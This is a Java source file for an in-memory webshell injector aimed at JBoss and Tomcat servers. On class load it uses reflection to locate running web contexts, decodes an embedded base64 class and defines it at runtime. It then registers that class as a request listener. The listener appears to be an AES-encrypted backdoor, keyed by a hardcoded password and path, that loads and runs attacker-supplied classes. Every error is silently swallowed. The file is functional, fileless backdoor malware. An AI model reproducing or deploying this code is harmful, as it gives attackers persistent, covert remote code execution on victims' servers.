package core.memshell;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class JBossListenerMemShell {
    private static ArrayList StanderContexts = new ArrayList();
    static {
        Inject();
    }

    public JBossListenerMemShell() {

        Inject();
    }




    public static synchronized void Inject() {
        getContext1();
        getContext();
        Iterator var1 = StanderContexts.iterator();
        while (var1.hasNext()) {
            Object var2 = var1.next();
            IMF(var2);
        }
    }

    public static synchronized void getContext1() {
        ArrayList var0 = new ArrayList();
        Object StandardContext = null;
        try {
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Thread[] threads = (Thread[]) getFV(threadGroup, "threads");
            for (Thread thread : threads) {
                if (thread.getName().startsWith("http-")) {
                    Object Endpoint = null;

                    Object tmp =  getFV(thread, "target");
                    if (tmp.getClass().getName().contains("PoolTcpEndpoint")){
                        Endpoint = tmp;
                    }
                    else{
                        Endpoint = getFV(tmp, "endpoint");
                    }
                    Object Http11Protocol = getFV(Endpoint, "handler");
                    Object RequestGroupInof = getFV(Http11Protocol, "global");
                    List Processors = (List) getFV(RequestGroupInof, "processors");
                    for (int i = 0; i < Processors.size(); i++) {
                        Object RequestInfo = (Object) Processors.get(i);
                        Object Request = getFV(RequestInfo, "req");
                        Object Request1 = Request.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(Request, 1);
                        Field f4 = Request1.getClass().getDeclaredField("context");
                        f4.setAccessible(true);
                        StandardContext = f4.get(Request1);
                        if (StandardContext != null) {
                            StanderContexts.add(StandardContext);
                            break;
                        }
                    }
                }
            }

        }catch(Exception e){}

    }

    public static synchronized void getContext() {
        Object StandardContext = null;
        try {
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Thread[] threads = (Thread[]) getFV(threadGroup, "threads");
            for (Thread thread : threads) {
                if (thread.getName().contains("Acceptor") && thread.getName().contains("http")) {
                    Object JioEndpoint$ = getFV(thread, "target");
                    Object JioEndpointO = getFV(JioEndpoint$, "this$0");
                    Object Http11Protocol = getFV(JioEndpointO, "handler");
                    Object RequestGroupInof = getFV(Http11Protocol, "global");
                    List Processors = (List) getFV(RequestGroupInof, "processors");
                    for (int i = 0; i < Processors.size(); i++) {
                        Object RequestInfo = (Object) Processors.get(i);
                        Object Request = getFV(RequestInfo, "req");
                        Object Request1 = Request.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(Request, 1);
                        Field f4 = Request1.getClass().getDeclaredField("context");
                        f4.setAccessible(true);
                        StandardContext = f4.get(Request1);
                        if (StandardContext != null) {
                            StanderContexts.add(StandardContext);
                            break;
                        }
                    }
                }
            }
        } catch (Exception e) {

        }
    }

    public static synchronized void IMF(Object var1) {
        try {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            String ListenerBase64 = "yv66vgAAADMBWQoAYACyCQBGALMJAEYAtAgAtQkARgC2CAC3CQBGALgIALkJAEYAugcAuwoACgCyCgAKALwKAAoAvQoARgC+CQBGAL8IAMAJAEYAwQoAYADCCgBgAMMIAMQKAMUAxgcAxwoAMQDICgAWAMkKAMUAygoAxQDLBwDMCADNCgDOAM8KADEA0AoAzgDRBwDSCgDOANMKACAA1AoAIADVCgAxANYIANcKAC4A2AgA2QcA2goALgDbBwDcCgDdAN4KADAA3wgA4AcA4QcAeQcA4gcA4wgA5AoALgDlCADmCADnCADoCADpCADqCgDrAOwHAO0KAEYA7ggA7wsAOgDwCADxCgAxAPILADoA8wsAOgD0CgBGAPUKAEYA9ggA9wsA+AD5BwD6CgAuAPsKAEYAwgoARgD8CwD4AP0IAP4LADoA/QcA/woATQCyCgAwAQALAF4BAQoAMQECCgEDAQQKADAAvQoATQEFCgBGAQYKADEBBwgBCAgBCQoAGwEKCABkCgAuAQsKAQwBDQoBDAEOBwEPCABiBwEQBwERAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB1MbWVtc2hlbGwvSkJvc3NMaXN0ZW5lclNoZWxsOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABegEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQACW0IBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAW0BAAFaAQANU3RhY2tNYXBUYWJsZQcA+gcBEgcAzAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAANyZXQHAOMBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABmJhc2U2NAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNgEAAmJzAQAFdmFsdWUBAApFeGNlcHRpb25zAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBABByZXF1ZXN0RGVzdHJveWVkAQAmKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7KVYBAANyZXEBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkHARMHAO0HAQ8HARQBABZnZXRSZXNwb25zZUZyb21SZXF1ZXN0AQBRKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAEdmFyMwEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAR2YXI1AQAEdmFyOAEABHZhcjEBAAR2YXIyAQAKU291cmNlRmlsZQEAF0pCb3NzTGlzdGVuZXJTaGVsbC5qYXZhDABsAG0MAGIAYwwAZABlAQAQM2M2ZTBiOGE5YzE1MjI0YQwAZgBnAQAEcEFTMwwAaABnAQAQL2Zhdmljb25kZW1vLmljbwwAaQBnAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMARUBFgwBFwEYDABqAIcMAGoAZwEABVVURi04DABrAGcMAGwAcwwBGQEaAQADQUVTBwESDAEbARwBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAEdAR4MAGwBHwwBIAEhDAEiASMBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwEkDAEbASUMASYBJwwBKAEpAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMASoBHgwAbAErDAEXASwMAS0BGAEAEGphdmEudXRpbC5CYXNlNjQMAS4BLwEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMATABMQEAE1tMamF2YS9sYW5nL09iamVjdDsHATIMATMBNAwBNQE2AQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMATcBOAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyBwETDAE5AToBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DACoAKkBABBYLVJlcXVlc3RlZC1XaXRoDAE7AIcBAA5YTUxIVFRQUmVxdWVzdAwBPAE9DAE+AT8MAUAAhwwAlQCWDAB6AHsBABBtZW1zaGVsbC5wYXlsb2FkBwEUDAFBAUIBABttZW1zaGVsbC9KQm9zc0xpc3RlbmVyU2hlbGwMAUMBRAwAdgB3DAFFAUYBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAUcBSAwBSQFKDAFLAUwHAU0MAU4BTwwBUAEeDACLAIwMAUsBLAEADlhtbEhUVFBSZXF1ZXN0AQAHU3VjY2VzcwwBUQBtDAFSAVMHAVQMAVUBVgwBVwFYAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0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";
            byte[] ListenerClass = base64Decode(ListenerBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);

            Class listenerClass = (Class) defineClass1.invoke(classLoader, ListenerClass, 0, ListenerClass.length);

            Object listenerObject = (Object) listenerClass.newInstance();
            Method m1 = var1.getClass().getDeclaredMethod("getApplicationEventListeners");
            m1.setAccessible(true);
            Object[] al = (Object[]) m1.invoke(var1);
            Object[] tempArr = new Object[al.length + 1];
            System.arraycopy(al, 0, tempArr, 0, al.length);
            tempArr[al.length] = listenerObject;
            Method m2 = var1.getClass().getDeclaredMethod("setApplicationEventListeners", Object[].class);
            m2.setAccessible(true);
            m2.invoke(var1, new Object[]{tempArr});
        } catch (Exception e) {
        }
    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }
}
